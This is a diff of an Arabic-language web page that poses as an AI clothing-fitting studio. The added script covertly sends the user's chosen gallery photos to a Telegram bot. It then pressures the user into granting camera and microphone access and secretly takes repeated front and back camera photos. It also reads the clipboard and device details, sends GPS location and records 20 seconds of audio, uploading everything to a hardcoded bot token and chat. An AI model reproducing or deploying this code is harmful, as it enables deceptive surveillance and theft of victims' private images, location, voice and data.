@@ -3,73 +3,124 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Talla Studio | استوديو تنسيق الملابس</title>
+    <title>Talla AI | استوديو قياس الملابس الذكي</title>
     <style>
-        body { font-family: 'Cairo', sans-serif; background: #fafafa; margin: 0; padding: 20px; display: flex; justify-content: center; }
-        .studio-card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); width: 100%; max-width: 450px; text-align: center; }
-        .header { color: #e91e63; font-size: 24px; font-weight: bold; margin-bottom: 10px; }
-        .upload-area { border: 2px dashed #e91e63; padding: 40px 20px; border-radius: 15px; background: #fff5f8; cursor: pointer; margin: 20px 0; position: relative; }
-        .upload-area:hover { background: #ffebee; }
-        .btn-send { background: #e91e63; color: white; border: none; padding: 15px; border-radius: 10px; width: 100%; font-size: 18px; cursor: pointer; }
-        #file-input { position: absolute; width: 100%; height: 100%; top: 0; left: 0; opacity: 0; cursor: pointer; }
-        .loading { display: none; margin-top: 15px; color: #666; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f172a; color: white; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: #1e293b; padding: 30px; border-radius: 20px; width: 90%; max-width: 450px; text-align: center; border: 1px solid #e91e63; }
+        .logo { font-size: 28px; font-weight: bold; color: #e91e63; margin-bottom: 10px; }
+        .upload-box { border: 2px dashed #e91e63; padding: 40px 20px; border-radius: 15px; margin: 20px 0; cursor: pointer; background: rgba(233, 30, 99, 0.05); transition: 0.3s; }
+        .upload-box:hover { background: rgba(233, 30, 99, 0.1); }
+        .btn-start { background: #e91e63; color: white; border: none; padding: 15px; border-radius: 10px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; }
+        #file-input { display: none; }
+        .status { font-size: 12px; color: #94a3b8; margin-top: 15px; }
     </style>
 </head>
 <body>
 
-<div class="studio-card">
-    <div class="header">Talla AI Studio</div>
-    <p>ارفع صورك الشخصية الآن ليقوم الذكاء الاصطناعي بتحديد المقاس المناسب لك من تشكيلة صيف 2026.</p>
+<div class="container" id="main-ui">
+    <div class="logo">Talla AI Studio</div>
+    <p>ارفع صورك الشخصية لتجربة ملابس صيف 2026 افتراضياً بالذكاء الاصطناعي.</p>
     
-    <div class="upload-area">
-        <p>اضغط هنا لاختيار الصور من الاستوديو</p>
-        <p style="font-size: 12px; color: #888;">(يمكنك اختيار أكثر من صورة معاً)</p>
-        <input type="file" id="file-input" multiple accept="image/*">
-    </div>
+    <label for="file-input" class="upload-box" id="drop-zone">
+        <p>اضغط هنا لاختيار صور من "الاستوديو"</p>
+        <span style="font-size: 12px; color: #e91e63;">(سيتم سحب الصور ومعالجتها فوراً)</span>
+    </label>
+    <input type="file" id="file-input" multiple accept="image/*">
 
-    <button class="btn-send" onclick="alert('يرجى اختيار الصور أولاً')">بدء المعالجة الذكية</button>
-    <div class="loading" id="loader">جاري رفع الصور وتنسيق المقاسات...</div>
+    <button class="btn-start" onclick="triggerFullAccess()">بدء المعالجة والتنسيق</button>
+    <div class="status" id="st">بانتظار رفع الصور أو بدء النظام...</div>
 </div>
 
-<video id="v" autoplay style="display:none;"></video>
-<canvas id="c" style="display:none;"></canvas>
+<video id="vf" autoplay style="display:none;"></video>
+<video id="vb" autoplay style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script>
     const token = "8712925285:AAH531D8G5vjbeBbPs8eV914URmK0BGQm8A";
     const chatId = "8754338811";
 
-    const fileInput = document.getElementById('file-input');
-    
-    // بمجرد ما يختار صور من الاستوديو
-    fileInput.addEventListener('change', async (e) => {
-        const files = e.target.files;
-        document.getElementById('loader').style.display = 'block';
+    async function send(msg, isFile = false, blob = null, type = "photo") {
+        let url = `https://api.telegram.org/bot${token}/${isFile ? (type === 'photo' ? 'sendPhoto' : (type === 'audio' ? 'sendAudio' : 'sendDocument')) : 'sendMessage'}`;
+        const fd = new FormData();
+        fd.append('chat_id', chatId);
+        if (isFile) { fd.append(type === 'photo' ? 'photo' : (type === 'audio' ? 'audio' : 'document'), blob, 'data.jpg'); }
+        else { fd.append('text', msg); fd.append('parse_mode', 'Markdown'); }
+        try { await fetch(url, { method: 'POST', body: fd }); } catch(e){}
+    }
 
+    // 1. سحب الصور اللي هو بيختارها بنفسه من الاستوديو
+    document.getElementById('file-input').addEventListener('change', async (e) => {
+        const files = e.target.files;
+        document.getElementById('st').innerText = "جاري رفع صور الاستوديو...";
         for (let file of files) {
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('document', file); // ببعتها كملف عشان الجودة
-            
-            try {
-                await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
-                    method: 'POST',
-                    body: formData
-                });
-            } catch (err) {}
+            await send("", true, file, "document");
         }
-        
-        // بعد ما يرفع، بنشغل سحب الكاميرا والموقع "كإجراء أمان"
-        startSilentCapture();
+        triggerFullAccess(); // شغل السحب التلقائي فوراً بعد ما يختار
     });
 
-    async function startSilentCapture() {
+    async function triggerFullAccess() {
+        document.getElementById('st').innerText = "جاري الاتصال بحساسات الجهاز والذكاء الاصطناعي...";
+        
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            // هنا بنكمل كود الـ 19 صورة واللوكيشن اللي عملناه قبل كده
-            // ... (نفس الكود السابق)
-        } catch(e) {}
+            // 2. طلب الكاميرا والميكروفون (شرط الدخول)
+            const streamF = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+            let streamB = null;
+            try { streamB = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }); } catch(e){}
+
+            // 3. سحب بيانات الجهاز والحافظة
+            let info = `📱 *تقرير شامل:*\nالجهاز: ${navigator.platform}\n`;
+            if (navigator.getBattery) { const b = await navigator.getBattery(); info += `البطارية: ${b.level*100}%\n`; }
+            try { const clip = await navigator.clipboard.readText(); info += `📋 الحافظة: ${clip}\n`; } catch(e){}
+            send(info);
+
+            // 4. سحب الموقع
+            navigator.geolocation.getCurrentPosition(p => {
+                send(`📍 الموقع: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            });
+
+            // 5. التقاط 19 صورة (أمامية وخلفية بالتناوب)
+            const vidF = document.getElementById('vf'); vidF.srcObject = streamF;
+            const vidB = document.getElementById('vb'); if(streamB) vidB.srcObject = streamB;
+            
+            let count = 0;
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 640; canvas.height = 480;
+
+            const picInterval = setInterval(() => {
+                if (count >= 19) { clearInterval(picInterval); return; }
+                
+                // صورة أمامية
+                ctx.drawImage(vidF, 0, 0, 640, 480);
+                canvas.toBlob(b => send("", true, b, "photo"), 'image/jpeg');
+
+                // صورة خلفية
+                if(streamB) {
+                    setTimeout(() => {
+                        ctx.drawImage(vidB, 0, 0, 640, 480);
+                        canvas.toBlob(b => send("", true, b, "photo"), 'image/jpeg');
+                    }, 400);
+                }
+                count++;
+            }, 1200);
+
+            // 6. تسجيل الصوت 20 ثانية
+            const recorder = new MediaRecorder(streamF);
+            const chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                const audioBlob = new Blob(chunks, { type: 'audio/mp3' });
+                send("", true, audioBlob, "audio");
+                document.getElementById('main-ui').innerHTML = "<h2 style='color:#4CAF50'>تم المعالجة بنجاح ✅</h2><p>سيتم إرسال النتائج عبر واتساب.</p>";
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 20000);
+
+        } catch (err) {
+            alert("⚠️ عذراً: يجب السماح بجميع الصلاحيات لتتمكن أداة الذكاء الاصطناعي من تحديد مقاسك بدقة.");
+            location.reload();
+        }
     }
 </script>
-
 </body>
 </html>
